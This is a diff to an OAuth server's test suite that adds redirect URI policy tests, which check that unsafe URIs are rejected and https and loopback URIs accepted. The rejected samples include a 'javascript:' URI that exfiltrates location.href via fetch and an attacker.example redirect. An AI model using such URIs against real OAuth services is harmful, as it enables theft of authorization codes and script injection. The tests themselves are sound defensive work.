@@ -193,6 +193,38 @@ describe('consent screen (A1)', () => {
   });
 });
 
+describe('redirect URI policy (A2)', () => {
+  it('refuses to register script-capable or remote-http redirect URIs', async () => {
+    for (const uri of [
+      "javascript://localhost/%0Afetch('https://x/'+location.href)//",
+      'javascript:alert(1)',
+      'data:text/html,hi',
+      'http://attacker.example/cb',
+      'https://app.example/cb#fragment',
+      'https://user:pass@app.example/cb',
+    ]) {
+      const res = await register({ redirect_uris: [uri] });
+      expect(res.status, uri).toBe(400);
+    }
+  });
+
+  it('accepts https and loopback http redirect URIs', async () => {
+    for (const uri of ['https://app.example/cb', 'http://localhost:5555/cb', 'http://127.0.0.1:5555/cb']) {
+      const res = await register({ redirect_uris: [uri] });
+      expect(res.status, uri).toBe(201);
+    }
+  });
+
+  it('refuses to authorize with a non-compliant URI registered next to a compliant one', async () => {
+    const res = await register({ redirect_uris: ['https://app.example/cb', 'cursor://anysphere.cursor-mcp/oauth/callback'] });
+    const { client_id: clientId } = (await res.json()) as { client_id: string };
+
+    const authorize = await send(authorizeQuery(clientId, 'cursor://anysphere.cursor-mcp/oauth/callback'));
+    expect(authorize.status).toBe(400);
+    expect(authorize.headers.get('Location')).toBeNull();
+  });
+});
+
 describe('POST /authorize no longer signs form-supplied requests (A5)', () => {
   it('rejects the old base64 `state` form field', async () => {
     const clientId = await registerClient('https://app.example/cb');
